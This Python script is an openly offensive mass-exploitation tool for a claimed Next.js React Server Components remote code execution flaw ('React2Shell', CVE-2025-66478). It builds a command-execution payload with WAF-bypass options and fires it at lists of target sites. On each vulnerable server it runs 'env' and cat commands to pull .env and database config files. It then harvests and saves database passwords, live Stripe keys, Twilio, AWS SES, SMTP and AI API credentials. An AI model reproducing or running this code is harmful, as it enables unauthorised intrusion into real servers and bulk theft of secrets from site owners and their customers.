import sys
import os
import json
import asyncio
import aiohttp
import random
import string
import urllib.parse
import base64
import re
import signal
from datetime import datetime
from configparser import ConfigParser

# Configuration
TIMEOUT = 15
MAX_CONCURRENT = 50
PID_RESTORE = '.nero_swallowtail'

class Colors:
    GREEN = '\033[32m'
    BRIGHT_GREEN = '\033[1;92m'
    AMBER = '\033[33m'
    DARK_GREEN = '\033[2;32m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    MAGENTA = '\033[95m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    RESET = '\033[0m'
    WHITE = '\033[97m'
    BLUE = '\033[94m'

# Global state for checkpoint
checkpoint_state = {
    'target_file': '',
    'output_dir': '',
    'last_processed': '',
    'waf_bypass': False,
    'waf_bypass_size_kb': 128,
    'unicode_encode': False,
    'processed_urls': set()
}

def print_banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    banner = f"""
{Colors.BRIGHT_GREEN}{Colors.BOLD}
██████╗ ███████╗ █████╗  ██████╗████████╗██████╗ ███████╗██╗  ██╗███████╗██╗     ██╗     
██╔══██╗██╔════╝██╔══██╗██╔════╝╚══██╔══╝╚════██╗██╔════╝██║  ██║██╔════╝██║     ██║     
██████╔╝█████╗  ███████║██║        ██║    █████╔╝███████╗███████║█████╗  ██║     ██║     
██╔══██╗██╔══╝  ██╔══██║██║        ██║   ██╔═══╝ ╚════██║██╔══██║██╔══╝  ██║     ██║     
██║  ██║███████╗██║  ██║╚██████╗   ██║   ███████╗███████║██║  ██║███████╗███████╗███████╗
╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝   ╚═╝   ╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
                                                                 
                        React2Shell RCE - CVE-2025-66478
{Colors.AMBER}{Colors.BOLD}
               Next.js RSC Remote Code Execution Vulnerability
               [ENHANCED] Automated Credential Extraction Mode
{Colors.DARK_GREEN}
          Author: Bob Marley (https://github.com/khadafigans)
          Enhanced: Automated ENV Grabber with Multi-Output
{Colors.RESET}
    """
    print(banner)
    print(f"{Colors.DARK_GREEN}System online, Welcome Administrator!. Ready to own everything.{Colors.RESET}\n")

def save_checkpoint():
    """Save current progress to checkpoint file"""
    try:
        config = ConfigParser()
        config['SESSION'] = {
            'TARGET_FILE': checkpoint_state['target_file'],
            'OUTPUT_DIR': checkpoint_state['output_dir'],
            'LAST_PROCESSED': checkpoint_state['last_processed'],
            'WAF_BYPASS': str(checkpoint_state['waf_bypass']),
            'WAF_BYPASS_SIZE_KB': str(checkpoint_state['waf_bypass_size_kb']),
            'UNICODE_ENCODE': str(checkpoint_state['unicode_encode']),
            'PROCESSED_COUNT': str(len(checkpoint_state['processed_urls']))
        }
        # Save processed URLs
        config['PROCESSED'] = {
            'URLS': '\n'.join(checkpoint_state['processed_urls'])
        }
        with open(PID_RESTORE, 'w') as f:
            config.write(f)
        print(f"\n{Colors.YELLOW}[!] CTRL+C detected — session saved to {PID_RESTORE}{Colors.RESET}")
        print(f"{Colors.CYAN}[*] Processed {len(checkpoint_state['processed_urls'])} URLs{Colors.RESET}")
        print(f"{Colors.CYAN}[*] Output directory: {checkpoint_state['output_dir']}{Colors.RESET}")
    except Exception as e:
        print(f"{Colors.RED}[!] Failed to save checkpoint: {e}{Colors.RESET}")

def load_checkpoint():
    """Load checkpoint from file if exists"""
    if not os.path.exists(PID_RESTORE):
        return None
    
    try:
        config = ConfigParser()
        config.read(PID_RESTORE)
        
        checkpoint = {
            'target_file': config.get('SESSION', 'TARGET_FILE'),
            'output_dir': config.get('SESSION', 'OUTPUT_DIR'),
            'last_processed': config.get('SESSION', 'LAST_PROCESSED'),
            'waf_bypass': config.get('SESSION', 'WAF_BYPASS') == 'True',
            'waf_bypass_size_kb': int(config.get('SESSION', 'WAF_BYPASS_SIZE_KB')),
            'unicode_encode': config.get('SESSION', 'UNICODE_ENCODE') == 'True',
            'processed_urls': set(config.get('PROCESSED', 'URLS').split('\n')) if config.get('PROCESSED', 'URLS') else set()
        }
        return checkpoint
    except Exception as e:
        print(f"{Colors.RED}[!] Failed to load checkpoint: {e}{Colors.RESET}")
        return None

def normalize_url(url: str) -> str:
    """Normalize URL - handles domain.com, http://, https://"""
    url = url.strip()
    if not url:
        return None
    if not url.startswith(("http://", "https://")):
        url = 'https://' + url
    return url.rstrip("/")

def generate_junk_data(size_kb: int = 128):
    """Generate random junk data for WAF bypass."""
    param_name = ''.join(random.choices(string.ascii_lowercase, k=12))
    junk = ''.join(random.choices(string.ascii_letters + string.digits, k=size_kb * 1024))
    return param_name, junk

def encode_unicode(data: str) -> str:
    """Encode string characters as Unicode escapes for WAF bypass."""
    result = []
    in_string = False
    i = 0
    while i < len(data):
        c = data[i]
        if c == '"':
            in_string = not in_string
            result.append(c)
        elif not in_string:
            result.append(c)
        elif c == '\\' and i + 1 < len(data):
            result.append(c)
            result.append(data[i + 1])
            i += 1
        else:
            result.append(f"\\u{ord(c):04x}")
        i += 1
    return ''.join(result)

def get_headers(content_type: str = None) -> dict:
    """Build request headers"""
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Next-Action": "x",
        "X-Nextjs-Request-Id": f"scan-{random.randint(1000, 9999)}",
        "X-Nextjs-Html-Request-Id": "SSTMXm7OJ_g0Ncx6jpQt9",
    }
    if content_type:
        headers["Content-Type"] = content_type
    return headers

def build_safe_payload():
    """Safe payload for detection"""
    boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
    body = (
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="1"\r\n\r\n'
        f"{{}}\r\n"
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="0"\r\n\r\n'
        f'["$1:aa:aa"]\r\n'
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad--"
    )
    content_type = f"multipart/form-data; boundary={boundary}"
    return body, content_type

def build_rce_payload(cmd: str, waf_bypass: bool = False, waf_bypass_size_kb: int = 128, unicode_encode: bool = False):
    """RCE payload with WAF bypass support"""
    boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
    
    escaped_cmd = cmd.replace("'", "\\'")
    prefix_payload = (
        f"var res=process.mainModule.require('child_process').execSync('{escaped_cmd}')"
        f".toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),"
        f"{{digest: `NEXT_REDIRECT;push;/login?a=${{encodeURIComponent(res)}};307;`}});"
    )

    part0 = json.dumps({
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": '{"then":"$B1337"}',
        "_response": {
            "_prefix": prefix_payload,
            "_chunks": "$Q2",
            "_formData": {"get": "$1:constructor:constructor"}
        }
    })

    if unicode_encode:
        part0 = encode_unicode(part0)

    parts = []

    if waf_bypass:
        param_name, junk = generate_junk_data(waf_bypass_size_kb)
        parts.append(
            f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
            f'Content-Disposition: form-data; name="{param_name}"\r\n\r\n'
            f"{junk}\r\n"
        )

    parts.extend([
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="0"\r\n\r\n'
        f"{part0}\r\n",
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="1"\r\n\r\n'
        f'"$@0"\r\n',
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="2"\r\n\r\n'
        f"[]\r\n",
        "------WebKitFormBoundaryx8jO2oVc6SWP3Sad--"
    ])

    body = "".join(parts)
    content_type = f"multipart/form-data; boundary={boundary}"
    return body, content_type

async def send_payload(session, url, body, content_type):
    """Send payload"""
    try:
        headers = get_headers(content_type)
        post_url = f"{url}/"
        
        async with session.post(
            post_url,
            data=body.encode('utf-8'),
            headers=headers,
            timeout=aiohttp.ClientTimeout(total=TIMEOUT),
            allow_redirects=False,
            ssl=False
        ) as resp:
            text = await resp.text()
            redirect = resp.headers.get("X-Action-Redirect", "")
            return resp.status, redirect, text
    except Exception as e:
        return None, '', str(e)

async def detect_safe(session, url):
    """Detect vulnerability"""
    body, content_type = build_safe_payload()
    status, redirect, text = await send_payload(session, url, body, content_type)
    
    if status == 500 and 'E{"digest"' in text:
        return True
    return False

async def exploit_rce(session, url, cmd, waf_bypass: bool = False, waf_bypass_size_kb: int = 128, unicode_encode: bool = False):
    """Execute command and get output"""
    body, content_type = build_rce_payload(cmd, waf_bypass=waf_bypass, waf_bypass_size_kb=waf_bypass_size_kb, unicode_encode=unicode_encode)
    status, redirect, text = await send_payload(session, url, body, content_type)
    
    if redirect:
        match = re.search(r'[?&]a=([^&;]+)', redirect)
        if match:
            output = urllib.parse.unquote(match.group(1))
            return True, output
    
    return False, "No output"

# ==================== DB URL PARSER ====================

def parse_database_url(db_url: str) -> dict:
    """
    Parse database URL and extract components.
    Enhanced to handle special characters in passwords and various formats.
    """
    result = {}
    if not db_url:
        return result
    
    try:
        # 1. Manual Split for robust parsing (handles special chars in password better than urlparse)
        if '://' in db_url:
            scheme, rest = db_url.split('://', 1)
            result['connection'] = scheme
            
            # Extract auth and server/path parts
            if '@' in rest:
                auth, server_part = rest.rsplit('@', 1)
                # Parse user:pass
                if ':' in auth:
                    result['user'], result['password'] = auth.split(':', 1)
                else:
                    result['user'] = auth
                
                # Parse host:port/dbname
                if '/' in server_part:
                    host_port, path = server_part.split('/', 1)
                    result['name'] = path.split('?')[0]
                    if ':' in host_port:
                        result['host'], result['port'] = host_port.split(':', 1)
                    else:
                        result['host'] = host_port
                else:
                    if ':' in server_part:
                        result['host'], result['port'] = server_part.split(':', 1)
                    else:
                        result['host'] = server_part
            else:
                # No @, could be just host:port/name or file:path
                if '/' in rest:
                    host_port, path = rest.split('/', 1)
                    result['name'] = path.split('?')[0]
                    if ':' in host_port:
                        result['host'], result['port'] = host_port.split(':', 1)
                    else:
                        result['host'] = host_port
        
        # 2. Fallback to standard urlparse for anything missed
        parsed = urllib.parse.urlparse(db_url)
        if parsed.scheme and not result.get('connection'):
            result['connection'] = parsed.scheme
        if parsed.username and not result.get('user'):
            result['user'] = urllib.parse.unquote(parsed.username)
        if parsed.password and not result.get('password'):
            result['password'] = urllib.parse.unquote(parsed.password)
        if parsed.hostname and not result.get('host'):
            result['host'] = parsed.hostname
        if parsed.port and not result.get('port'):
            result['port'] = str(parsed.port)
        if parsed.path and parsed.path != '/' and not result.get('name'):
            result['name'] = parsed.path.lstrip('/').split('?')[0]
            
    except Exception:
        pass
    
    return result

# ==================== CREDENTIAL EXTRACTION ====================

def parse_env_content(content: str) -> list:
    """Parse .env content into a list of key-value pairs, including comments."""
    results = []
    for line in content.split('\n'):
        line = line.strip()
        if not line: continue
        
        # Handle commented lines by stripping the leading # for parsing
        is_commented = line.startswith('#')
        clean_line = line.lstrip('#').strip()
        
        if '=' in clean_line:
            key, _, value = clean_line.partition('=')
            key = key.strip()
            value = value.strip().strip('"').strip("'")
            if key:
                results.append({'key': key, 'value': value, 'commented': is_commented})
    return results

def extract_db_credentials(parsed_vars: list, url: str) -> list:
    """Extract database credentials from parsed variables."""
    db_results = []
    url_keys = {'DATABASE_URL', 'DB_URL', 'MYSQL_URL', 'POSTGRES_URL', 'PG_URL', 'MONGODB_URI', 'MONGO_URL'}
    conn_keys = {'DB_CONNECTION', 'DATABASE_CONNECTION', 'DB_DRIVER', 'DATABASE_DRIVER'}
    host_keys = {'DB_HOST', 'DATABASE_HOST', 'MYSQL_HOST', 'POSTGRES_HOST', 'PG_HOST'}
    port_keys = {'DB_PORT', 'DATABASE_PORT', 'MYSQL_PORT', 'POSTGRES_PORT', 'PG_PORT'}
    user_keys = {'DB_USER', 'DB_USERNAME', 'DATABASE_USER', 'DATABASE_USERNAME', 'MYSQL_USER', 'POSTGRES_USER', 'PG_USER'}
    pass_keys = {'DB_PASS', 'DB_PASSWORD', 'DATABASE_PASS', 'DATABASE_PASSWORD', 'MYSQL_PASSWORD', 'POSTGRES_PASSWORD', 'PG_PASSWORD'}
    name_keys = {'DB_NAME', 'DB_DATABASE', 'DATABASE_NAME', 'DATABASE', 'MYSQL_DATABASE', 'POSTGRES_DB', 'PG_DATABASE'}

    seen_urls = set()
    for item in parsed_vars:
        if item['key'] in url_keys:
            val = item['value']
            if val and val not in seen_urls:
                info = parse_database_url(val)
                info['url'] = url
                info['db_url'] = val
                info['commented'] = item['commented']
                
                db_name = info.get('name', '')
                is_local = (val.startswith('file:') or '.db' in val or 'sqlite' in val) or (db_name and ('.db' in db_name or '/' in db_name))
                has_remote = info.get('host') or info.get('user') or info.get('password')
                
                if not is_local or has_remote:
                    db_results.append(info)
                    seen_urls.add(val)

    if not db_results:
        info = {'url': url}
        for item in parsed_vars:
            k, v = item['key'], item['value']
            if not v: continue
            if k in host_keys and 'host' not in info: info['host'] = v
            if k in user_keys and 'user' not in info: info['user'] = v
            if k in pass_keys and 'password' not in info: info['password'] = v
            if k in name_keys and 'name' not in info: info['name'] = v
            if k in port_keys and 'port' not in info: info['port'] = v
            if k in conn_keys and 'connection' not in info: info['connection'] = v
        
        if len(info) > 1:
            db_results.append(info)

    return db_results

def extract_stripe_keys(parsed_vars: list, url: str) -> list:
    """Extract Stripe keys - sk_live_ only"""
    found = []
    seen = set()
    for item in parsed_vars:
        k, v = item['key'], item['value']
        if v.startswith('sk_live_') and v not in seen:
            found.append({'url': url, 'secret': v, 'commented': item['commented']})
            seen.add(v)
        elif 'stripe' in k.lower() and v.startswith('sk_live_') and v not in seen:
            found.append({'url': url, 'secret': v, 'commented': item['commented']})
            seen.add(v)
    return found

def extract_twilio_credentials(parsed_vars: list, url: str) -> list:
    """Extract Twilio credentials"""
    found = []
    sids = [i for i in parsed_vars if i['key'] in {'TWILIO_ACCOUNT_SID', 'TWILIO_SID', 'TWILIO_ACCOUNT_ID'}]
    tokens = [i for i in parsed_vars if i['key'] in {'TWILIO_API_KEY', 'TWILIO_AUTH_TOKEN', 'TWILIO_TOKEN', 'TWILIO_API_SECRET'}]
    numbers = [i for i in parsed_vars if i['key'] in {'TWILIO_NUMBER', 'TWILIO_PHONE_NUMBER'}]
    
    for s in sids:
        for t in tokens:
            if s['commented'] == t['commented']:
                info = {
                    'url': url,
                    'account_sid': s['value'],
                    'api_key': t['value'],
                    'number': '',
                    'commented': s['commented']
                }
                for n in numbers:
                    if n['commented'] == s['commented']:
                        info['number'] = n['value']
                        break
                found.append(info)
    return found

def extract_ai_keys(parsed_vars: list, url: str) -> list:
    """Extract AI API keys"""
    ai_keys = []
    seen = set()
    
    mapping = {
        'OPEN-AI': (['OPENAI_API_KEY', 'OPENAI_KEY', 'OPENAI_SECRET_KEY'], 'sk-'),
        'GEMINI': (['GEMINI_API_KEY', 'GOOGLE_AI_KEY', 'GOOGLE_API_KEY', 'GEMINI_KEY'], ''),
        'ANTHROPIC': (['ANTHROPIC_API_KEY', 'CLAUDE_API_KEY', 'ANTHROPIC_KEY'], 'sk-ant-'),
        'GROK': (['GROK_API_KEY', 'XAI_API_KEY', 'GROK_KEY'], 'xai-'),
        'DEEPSEEK': (['DEEPSEEK_API_KEY', 'DEEPSEEK_KEY'], 'sk-')
    }
    
    for item in parsed_vars:
        k, v = item['key'], item['value']
        if not v or v in seen: continue
        
        for type_name, (keys, prefix) in mapping.items():
            if k in keys and v.startswith(prefix):
                ai_keys.append({'url': url, 'type': type_name, 'key': v, 'commented': item['commented']})
                seen.add(v)
                break
    return ai_keys

def extract_aws_ses(parsed_vars: list, url: str) -> list:
    found = []
    seen = set()
    
    # Simple check for AKIA
    for item in parsed_vars:
        v = item['value']
        if v.startswith('AKIA') and v not in seen:
            info = {
                'url': url,
                'access_key_id': v,
                'commented': item['commented'],
                'host': '', 'region': '', 'secret_access_key': '', 'from_email': '', 'from_name': ''
            }
            # Look for related keys with same commented status
            for sub in parsed_vars:
                if sub['commented'] == item['commented']:
                    sk, sv = sub['key'], sub['value']
                    if sk in ['SES_SECRET_ACCESS_KEY', 'AWS_SECRET_ACCESS_KEY', 'AWS_SECRET_KEY', 'SES_SECRET', 'MAIL_PASSWORD']: info['secret_access_key'] = sv
                    if sk in ['SES_HOST', 'AWS_SES_HOST', 'MAIL_HOST', 'SMTP_HOST'] and ('amazonaws' in sv or 'email-smtp' in sv): info['host'] = sv
                    if sk in ['SES_REGION', 'AWS_SES_REGION', 'AWS_REGION', 'AWS_DEFAULT_REGION']: info['region'] = sv
                    if sk in ['SES_FROM_EMAIL', 'AWS_SES_FROM_EMAIL', 'MAIL_FROM_ADDRESS', 'MAIL_FROM']: info['from_email'] = sv
                    if sk in ['SES_FROM_NAME', 'AWS_SES_FROM_NAME', 'MAIL_FROM_NAME']: info['from_name'] = sv
            found.append(info)
            seen.add(v)
    return found

def extract_smtp(parsed_vars: list, url: str) -> list:
    found = []
    hosts = [i for i in parsed_vars if i['key'] in {'SMTP_HOST', 'MAIL_HOST', 'EMAIL_HOST', 'SMTP_SERVER', 'MAIL_SERVER'}]
    users = [i for i in parsed_vars if i['key'] in {'SMTP_USERNAME', 'SMTP_USER', 'MAIL_USERNAME', 'MAIL_USER', 'EMAIL_USER', 'EMAIL_USERNAME'}]
    
    for h in hosts:
        for u in users:
            if h['commented'] == u['commented']:
                info = {
                    'url': url, 'host': h['value'], 'username': u['value'], 'commented': h['commented'],
                    'port': '', 'password': '', 'from_mail': ''
                }
                for sub in parsed_vars:
                    if sub['commented'] == h['commented']:
                        sk, sv = sub['key'], sub['value']
                        if sk in ['SMTP_PORT', 'MAIL_PORT', 'EMAIL_PORT']: info['port'] = sv
                        if sk in ['SMTP_PASSWORD', 'SMTP_PASS', 'MAIL_PASSWORD', 'MAIL_PASS', 'EMAIL_PASSWORD', 'EMAIL_PASS']: info['password'] = sv
                        if sk in ['SMTP_FROM_MAIL', 'SMTP_FROM', 'MAIL_FROM', 'MAIL_FROM_ADDRESS', 'EMAIL_FROM']: info['from_mail'] = sv
                found.append(info)
    return found

# ==================== OUTPUT FORMATTERS ====================

def format_db_output(db_info: dict) -> str:
    lines = [f"URL: {db_info.get('url', '')}"]
    if db_info.get('commented'): lines.append("STATUS: [COMMENTED/DISABLED]")
    lines.append(f"DB_CONNECTION: {db_info.get('connection', '')}")
    lines.append(f"DB_HOST: {db_info.get('host', '')}")
    lines.append(f"DB_PORT: {db_info.get('port', '')}")
    lines.append(f"DB_USER: {db_info.get('user', '')}")
    lines.append(f"DB_PASS: {db_info.get('password', '')}")
    lines.append(f"DB_NAME: {db_info.get('name', '')}")
    lines.append(f"DB_URL: {db_info.get('db_url', '')}")
    return '\n'.join(lines) + '\n\n'

def format_stripe_output(stripe_info: dict) -> str:
    lines = [f"URL: {stripe_info.get('url', '')}"]
    if stripe_info.get('commented'): lines.append("STATUS: [COMMENTED/DISABLED]")
    lines.append(f"STRIPE_SECRET: {stripe_info.get('secret', '')}")
    return '\n'.join(lines) + '\n\n'

def format_twilio_output(twilio_info: dict) -> str:
    lines = [f"URL: {twilio_info.get('url', '')}"]
    if twilio_info.get('commented'): lines.append("STATUS: [COMMENTED/DISABLED]")
    lines.append(f"TWILIO_ACCOUNT_SID: {twilio_info.get('account_sid', '')}")
    lines.append(f"TWILIO_API_KEY: {twilio_info.get('api_key', '')}")
    lines.append(f"TWILIO_NUMBER: {twilio_info.get('number', '')}")
    return '\n'.join(lines) + '\n\n'

def format_ai_key_output(ai_info: dict) -> str:
    lines = [f"URL: {ai_info.get('url', '')}"]
    if ai_info.get('commented'): lines.append("STATUS: [COMMENTED/DISABLED]")
    lines.append(f"TYPE: {ai_info.get('type', '')}")
    lines.append(f"KEY: {ai_info.get('key', '')}")
    return '\n'.join(lines) + '\n\n'

def format_ses_output(ses_info: dict) -> str:
    lines = [f"URL: {ses_info.get('url', '')}"]
    if ses_info.get('commented'): lines.append("STATUS: [COMMENTED/DISABLED]")
    lines.append(f"SES_HOST: {ses_info.get('host', '')}")
    lines.append(f"SES_REGION: {ses_info.get('region', '')}")
    lines.append(f"SES_ACCESS_KEY_ID: {ses_info.get('access_key_id', '')}")
    lines.append(f"SES_SECRET_ACCESS_KEY: {ses_info.get('secret_access_key', '')}")
    lines.append(f"SES_FROM_EMAIL: {ses_info.get('from_email', '')}")
    lines.append(f"SES_FROM_NAME: {ses_info.get('from_name', '')}")
    return '\n'.join(lines) + '\n\n'

def format_smtp_output(smtp_info: dict) -> str:
    lines = [f"URL: {smtp_info.get('url', '')}"]
    if smtp_info.get('commented'): lines.append("STATUS: [COMMENTED/DISABLED]")
    lines.append(f"SMTP_HOST: {smtp_info.get('host', '')}")
    lines.append(f"SMTP_PORT: {smtp_info.get('port', '')}")
    lines.append(f"SMTP_USERNAME: {smtp_info.get('username', '')}")
    lines.append(f"SMTP_PASSWORD: {smtp_info.get('password', '')}")
    lines.append(f"SMTP_FROM_MAIL: {smtp_info.get('from_mail', '')}")
    return '\n'.join(lines) + '\n\n'

# ==================== MAIN LOGIC ====================

async def grab_env_files(session, url, waf_bypass=False, waf_bypass_size_kb=128, unicode_encode=False):
    all_env_content = ""
    success, output = await exploit_rce(session, url, "env", waf_bypass, waf_bypass_size_kb, unicode_encode)
    if success and output and output != "No output": all_env_content += output + "\n"

    env_files = ['.env', '.env.local', '.env.production', '.env.development']
    for env_file in env_files:
        cmd = f"cat {env_file} 2>/dev/null || cat ../{env_file} 2>/dev/null || cat ../../{env_file} 2>/dev/null"
        success, output = await exploit_rce(session, url, cmd, waf_bypass, waf_bypass_size_kb, unicode_encode)
        if success and output and output != "No output" and "No such file" not in output:
            all_env_content += output + "\n"
    return all_env_content

async def process_target(session, url, waf_bypass, waf_bypass_size_kb, unicode_encode, output_files, stats, lock):
    global checkpoint_state
    checkpoint_state['last_processed'] = url
    checkpoint_state['processed_urls'].add(url)
    
    if not await detect_safe(session, url):
        print(f"{Colors.DIM}[-] {url} - Not vulnerable{Colors.RESET}")
        return
    
    print(f"{Colors.BRIGHT_GREEN}[VULN] {url} - Vulnerable! Extracting credentials...{Colors.RESET}")
    async with lock: stats['vuln'] += 1
    
    env_content = await grab_env_files(session, url, waf_bypass, waf_bypass_size_kb, unicode_encode)
    if not env_content: return
    
    parsed_vars = parse_env_content(env_content)
    
    results = {
        'db': extract_db_credentials(parsed_vars, url),
        'stripe': extract_stripe_keys(parsed_vars, url),
        'twilio': extract_twilio_credentials(parsed_vars, url),
        'ai': extract_ai_keys(parsed_vars, url),
        'ses': extract_aws_ses(parsed_vars, url),
        'smtp': extract_smtp(parsed_vars, url)
    }

    # Fallback: If no DB found in env, hunt for Prisma/Config files
    if not results['db']:
        prisma_files = ['prisma/schema.prisma', 'schema.prisma', 'config/database.js', 'config/db.ts']
        for p_file in prisma_files:
            p_cmd = f"cat {p_file} 2>/dev/null || cat ../{p_file} 2>/dev/null"
            p_success, p_output = await exploit_rce(session, url, p_cmd, waf_bypass, waf_bypass_size_kb, unicode_encode)
            if p_success and p_output and "No such file" not in p_output:
                db_url_match = re.search(r'url\s*=\s*["\']([^"\']+)["\']', p_output)
                if db_url_match:
                    p_db_url = db_url_match.group(1)
                    if not p_db_url.startswith('env('):
                        p_parsed = parse_database_url(p_db_url)
                        p_parsed['url'] = url
                        p_parsed['db_url'] = p_db_url
                        if not (p_db_url.startswith('file:') or '.db' in p_db_url) or p_parsed.get('host'):
                            results['db'] = [p_parsed]
                            break

    found_items = []
    if results['db']:
        with open(output_files['db'], 'a', encoding='utf-8') as f:
            for item in results['db']: f.write(format_db_output(item))
        found_items.append(f"{Colors.CYAN}DATABASE{Colors.RESET}")
        async with lock: stats['db'] += len(results['db'])
    
    if results['stripe']:
        with open(output_files['stripe'], 'a', encoding='utf-8') as f:
            for item in results['stripe']: f.write(format_stripe_output(item))
        found_items.append(f"{Colors.MAGENTA}STRIPE{Colors.RESET}")
        async with lock: stats['stripe'] += len(results['stripe'])
        
    if results['twilio']:
        with open(output_files['twilio'], 'a', encoding='utf-8') as f:
            for item in results['twilio']: f.write(format_twilio_output(item))
        found_items.append(f"{Colors.BLUE}TWILIO{Colors.RESET}")
        async with lock: stats['twilio'] += len(results['twilio'])
        
    if results['ai']:
        with open(output_files['ai'], 'a', encoding='utf-8') as f:
            for item in results['ai']: 
                f.write(format_ai_key_output(item))
                found_items.append(f"{Colors.GREEN}{item['type']}{Colors.RESET}")
        async with lock: stats['ai'] += len(results['ai'])
        
    if results['ses']:
        with open(output_files['ses'], 'a', encoding='utf-8') as f:
            for item in results['ses']: f.write(format_ses_output(item))
        found_items.append(f"{Colors.AMBER}AWS-SES{Colors.RESET}")
        async with lock: stats['ses'] += len(results['ses'])
        
    if results['smtp']:
        with open(output_files['smtp'], 'a', encoding='utf-8') as f:
            for item in results['smtp']: f.write(format_smtp_output(item))
        found_items.append(f"{Colors.DARK_GREEN}SMTP{Colors.RESET}")
        async with lock: stats['smtp'] += len(results['smtp'])

    if found_items:
        print(f"{Colors.WHITE}  └── Found: {', '.join(dict.fromkeys(found_items))}{Colors.RESET}")
    else:
        print(f"{Colors.YELLOW}  └── .env found but no target credentials{Colors.RESET}")

async def scan_targets(targets, waf_bypass, waf_bypass_size_kb, unicode_encode, output_files, skip_urls=None):
    connector = aiohttp.TCPConnector(limit=MAX_CONCURRENT, ssl=False)
    stats = {'vuln': 0, 'db': 0, 'stripe': 0, 'twilio': 0, 'ai': 0, 'ses': 0, 'smtp': 0}
    lock = asyncio.Lock()
    
    if skip_urls:
        targets = [t for t in targets if normalize_url(t) not in skip_urls]
        print(f"{Colors.CYAN}[*] Skipping {len(skip_urls)} already processed URLs{Colors.RESET}")
    
    async with aiohttp.ClientSession(connector=connector, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as session:
        semaphore = asyncio.Semaphore(MAX_CONCURRENT)
        async def process_with_semaphore(url):
            async with semaphore:
                return await process_target(session, url, waf_bypass, waf_bypass_size_kb, unicode_encode, output_files, stats, lock)
        tasks = [process_with_semaphore(normalize_url(t)) for t in targets if normalize_url(t)]
        await asyncio.gather(*tasks)
        return stats

def signal_handler(signum, frame):
    save_checkpoint()
    sys.exit(0)

async def main():
    global checkpoint_state
    signal.signal(signal.SIGINT, signal_handler)
    print_banner()
    
    checkpoint = load_checkpoint()
    resume = 'n'
    if checkpoint:
        print(f"{Colors.YELLOW}[!] Session checkpoint found!{Colors.RESET}")
        print(f"{Colors.CYAN}    Target file: {checkpoint['target_file']}{Colors.RESET}")
        print(f"{Colors.CYAN}    Output dir: {checkpoint['output_dir']}{Colors.RESET}")
        print(f"{Colors.CYAN}    Processed: {len(checkpoint['processed_urls'])} URLs{Colors.RESET}")
        resume = input(f"{Colors.AMBER}[+] Continue from checkpoint? (Y/n): {Colors.RESET}").strip().lower()
        if resume != 'n':
            checkpoint_state = checkpoint.copy()
            target_input, output_dir = checkpoint['target_file'], checkpoint['output_dir']
            waf_bypass, waf_bypass_size_kb, unicode_encode = checkpoint['waf_bypass'], checkpoint['waf_bypass_size_kb'], checkpoint['unicode_encode']
            skip_urls = checkpoint['processed_urls']
            print(f"{Colors.GREEN}[*] Resuming from checkpoint...{Colors.RESET}")
        else:
            try: os.remove(PID_RESTORE)
            except: pass
    
    if not checkpoint or resume == 'n':
        target_input = input(f"{Colors.AMBER}[+] Targets file path: {Colors.RESET}").strip()
        if not os.path.isfile(target_input):
            print(f"{Colors.RED}[!] File not found: {target_input}{Colors.RESET}")
            return
        waf_bypass = input(f"{Colors.AMBER}[+] Enable WAF bypass? (y/n) [n]: {Colors.RESET}").strip().lower() == 'y'
        waf_bypass_size_kb = 128
        if waf_bypass:
            size_input = input(f"{Colors.AMBER}[+] Junk data size in KB (default 128): {Colors.RESET}").strip()
            if size_input.isdigit(): waf_bypass_size_kb = int(size_input)
        unicode_encode = input(f"{Colors.AMBER}[+] Enable Unicode encoding? (y/n) [n]: {Colors.RESET}").strip().lower() == 'y'
        output_dir = f"Result_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        os.makedirs(output_dir, exist_ok=True)
        skip_urls = None
    
    with open(target_input, encoding='utf-8') as f:
        targets = [l.strip() for l in f if l.strip() and not l.startswith('#')]
    
    checkpoint_state.update({'target_file': target_input, 'output_dir': output_dir, 'waf_bypass': waf_bypass, 'waf_bypass_size_kb': waf_bypass_size_kb, 'unicode_encode': unicode_encode})
    
    output_files = {
        'db': f"{output_dir}/DB-Credentials.txt", 'stripe': f"{output_dir}/Stripe-Key.txt",
        'twilio': f"{output_dir}/Twilio.txt", 'ai': f"{output_dir}/AI-Key.txt",
        'ses': f"{output_dir}/AWS-SES.txt", 'smtp': f"{output_dir}/SMTP.txt", 'vuln': f"{output_dir}/Vulnerable.txt"
    }
    
    if not skip_urls:
        for fpath in output_files.values(): open(fpath, 'w', encoding='utf-8').close()
    
    print(f"{Colors.CYAN}[*] Loaded {len(targets)} targets{Colors.RESET}")
    print(f"\n{Colors.CYAN}[*] Output directory: {output_dir}/{Colors.RESET}")
    print(f"{Colors.CYAN}[*] Starting automated credential extraction...{Colors.RESET}")
    print(f"{Colors.YELLOW}[*] Press CTRL+C to save progress and exit{Colors.RESET}")
    print(f"{Colors.DARK_GREEN}{'='*70}{Colors.RESET}\n")
    
    stats = await scan_targets(targets, waf_bypass, waf_bypass_size_kb, unicode_encode, output_files, skip_urls)
    
    # Summary
    print(f"\n{Colors.DARK_GREEN}{'='*70}{Colors.RESET}")
    print(f"{Colors.BRIGHT_GREEN}{Colors.BOLD}                         SCAN COMPLETE{Colors.RESET}")
    print(f"{Colors.DARK_GREEN}{'='*70}{Colors.RESET}")
